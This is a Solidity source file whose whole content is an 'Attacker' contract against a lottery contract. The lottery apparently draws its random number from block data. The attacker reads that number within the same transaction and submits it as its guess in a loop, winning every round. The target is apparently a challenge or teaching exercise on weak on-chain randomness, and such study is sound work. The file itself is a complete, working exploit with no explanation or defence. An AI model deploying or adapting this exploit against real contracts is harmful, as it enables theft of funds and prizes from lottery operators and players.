// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILottery {
    function random() external view returns (uint256);
    function guess(uint256 _guess) external;
    function streaks(address) external view returns (uint256);
    function winner() external view returns (address);
}

/// @notice random() is a pure function of the executing block context, so
/// reading it inside the same tx that calls guess() pins the target exactly.
contract Attacker {
    address public immutable lottery;

    constructor(address _lottery) {
        lottery = _lottery;
    }

    function run(uint256 _n) external {
        for (uint256 i = 0; i < _n; i++) {
            uint256 target = ILottery(lottery).random() % 100;
            ILottery(lottery).guess(target);
        }
    }
}
